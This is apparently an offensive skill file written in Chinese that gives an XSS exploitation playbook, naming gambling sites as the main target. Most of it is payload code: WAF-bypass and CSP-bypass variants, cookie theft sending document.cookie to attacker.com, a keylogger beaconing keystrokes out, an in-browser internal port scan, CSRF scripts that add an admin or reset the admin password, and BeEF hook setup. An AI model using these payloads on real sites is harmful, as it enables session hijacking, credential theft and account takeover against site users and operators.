---
name: 毒道浸染·深
description: >-
 XSS 漏洞完整利用链：反射型/存储型/DOM 型/Mutation XSS 检测、WAF 绕过 Payload 构造、
 CSP 绕过、Session 劫持、XSS 打平台（BeEF/XSS Hunter）。
version: 1.0.0
---

# XSS 跨站脚本注入

## 作业入口（先跑这个）

客服/IM/备注存储型（博彩站主力）：

```bash
python3 炼蛊房/stored_xss_probe.py scan --base https://授权站 --token <用户票> --case <案卷>
```

反射/DOM 面先 `core_web_surface_probe` 再手测。弹窗不算接管；要会话/CSRF 加款才算。 
总卡：`传承/薄青·岁岁索命.md`

## 触发条件

：
- XSS、跨站脚本、反射型 XSS、存储型 XSS
- DOM XSS、Mutation XSS、mXSS
- CSP 绕过、Content Security Policy
- alert(1)、弹窗、document.cookie 盗取
- BeEF、XSS Hunter、xsshunter
- XSS → 账户接管、XSS + CSRF

---

## 1. 基础检测 Payload

```javascript
// 基础
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe onload=alert(1)>
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
<video src=x onerror=alert(1)>

// 属性注入（已在属性中）
" onmouseover="alert(1)
' onmouseover='alert(1)
" autofocus onfocus="alert(1)

// JavaScript 上下文中
';alert(1)//
\';alert(1)//
</script><script>alert(1)</script>

// URL 参数中
javascript:alert(1)
data:text/html,<script>alert(1)</script>
```

---

## 2. WAF 绕过 Payload 构造

```javascript
// 大小写混淆
<ScRiPt>alert(1)</sCrIpT>
<IMG SRC=x OnErRoR=alert(1)>

// HTML 编码
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
<svg onload=\u0061\u006c\u0065\u0072\u0074(1)>

// Unicode/双重编码
<img src=x onerror=\u0061lert(1)>

// 拆分 script 标签
<scr<script>ipt>alert(1)</scr</script>ipt>

// 事件处理器绕过关键词过滤
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>

// 无括号 alert
<img src=x onerror=alert`1`>
<img src=x onerror=window['alert'](1)>
<svg onload=top['ale'+'rt'](1)>

// 注释干扰
<scr<!---->ipt>alert(1)</scr<!---->ipt>
<!-<img src=x onerror=alert(1)//->

// 换行/制表符
<img
src=x
onerror
=alert(1)>
```

---

## 3. DOM XSS

```javascript
// 常见 Source（用户可控）
location.href
location.hash
location.search
document.URL
document.referrer
window.name
postMessage

// 常见 Sink（执行点）
eval()
document.write()
document.writeln()
innerHTML = ...
outerHTML = ...
setTimeout("...", 0)
setInterval("...", 0)
location.href = ...
$.html() / .append()（jQuery）

// 检测 DOM XSS
# 在 Chrome DevTools Console：
document.getElementById('output').innerHTML // 看是否有用户输入
location.hash // 片段注入

// 典型案例（hash 注入）
http://target.com/page#<img src=x onerror=alert(1)>
http://target.com/page#<script>alert(1)</script>
```

---

## 4. CSP 绕过

```javascript
// 查看 CSP
curl -I http://target.com | grep -i content-security-policy

// 常见弱 CSP 绕过
// unsafe-eval 存在 → eval() 可用
// unsafe-inline 存在 → 内联 script 可用
// CDN 白名单（如 ajax.googleapis.com）→ JSONP 劫持

// nonce 泄露（CSP nonce 在页面源码中可见时）
<script nonce="泄露的nonce">alert(1)</script>

// script-src 'strict-dynamic' 绕过
<script>document.write('<script src="http://attacker.com/xss.js"><\/script>')</script>

// meta redirect（规避 frame-src/navigate-to）
<meta http-equiv="refresh" content="0;url=javascript:alert(1)">

// JSONP（白名单域上有 JSONP 端点）
<script src="https://allowed-cdn.com/api?callback=alert(1)"></script>

// base 标签（改变相对路径）
<base href="http://attacker.com/">
```

---

## 5. 存储型 XSS 利用链

### 5.1 Session 劫持

```javascript
// 发送 Cookie 到攻击者服务器
<script>
new Image().src='http://attacker.com/steal?c='+encodeURIComponent(document.cookie);
</script>

// fetch 方式（绕过 CSP img-src 限制）
<script>
fetch('http://attacker.com/steal?c='+btoa(document.cookie));
</script>
```

### 5.2 键盘记录

```javascript
<script>
document.addEventListener('keyup', function(e){
 fetch('http://attacker.com/log?k='+encodeURIComponent(e.key));
});
</script>
```

### 5.3 内网端口扫描

```javascript
<script>
const targets = ['192.168.1.1','192.168.1.254'];
const ports = [80,443,8080,8443,22,3389];
targets.forEach(ip => ports.forEach(port => {
 const img = new Image();
 const t = Date.now();
 img.onload = img.onerror = () => {
 fetch(`http://attacker.com/scan?ip=${ip}&port=${port}&ms=${Date.now()-t}&open=1`);
 };
 img.src = `http://${ip}:${port}/`;
}));
</script>
```

### 5.4 管理员账户接管

```javascript
// 1. 在管理后台执行 CSRF（添加新管理员）
<script>
fetch('/admin/adduser', {
 method: 'POST',
 credentials: 'include',
 headers: {'Content-Type': 'application/x-www-form-urlencoded'},
 body: 'username=hacked&password=hacked123&role=admin'
});
</script>

// 2. 修改管理员密码
<script>
fetch('/admin/changepass', {
 method: 'POST',
 credentials: 'include',
 body: JSON.stringify({new_password: 'hacked123'}),
 headers: {'Content-Type': 'application/json'}
});
</script>
```

---

## 6. 自动化平台

```bash
# XSS Hunter（盲打 XSS）
# 注册 https://xsshunter.trufflesecurity.com
# 使用提供的 payload，触发时邮件通知

# BeEF（浏览器利用框架）
git clone https://github.com/beefproject/beef
cd beef && bundle install
./beef
# 默认面板：http://127.0.0.1:3000/ui/panel
# Hook: <script src="http://攻击机:3000/hook.js"></script>

# 盲打 payload（常用于 User-Agent/Referer/表单提交后看不到结果的场景）
<script src=https://xss.xsshunter.com/p/自己的></script>
"><img src=x onerror=eval(atob('base64_payload'))>
```

---

## 7. Mutation XSS（mXSS）

```javascript
// 原理：innerHTML 赋值后 DOM 解析时发生突变
// 常见场景：sanitize 库处理后再插入 innerHTML

// 测试 payload
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
<listing><img src=x onerror=alert(1)>
<svg><![CDATA[</svg><img src=x onerror=alert(1)>]]>
```

---

## 快速流程

```
找注入点（search/name/comment/UA/Referer）
 → 测 <img src=x onerror=alert(1)>
 → 有 WAF → 试编码/大小写/事件替换
 → 存储型 → 打 Cookie / 键记 / CSRF 接管管理员
 → 盲打场景（后台/日志）→ XSS Hunter payload
 → 有 CSP → 查白名单 JSONP / nonce 泄露
```

配套：`evasion` · `waf-js-challenge-bypass` · `api-security`

## 真源

- 手法：`传承/薄青·岁岁索命.md`
- 工具：`python3 炼蛊房/core_web_surface_probe.py --help`
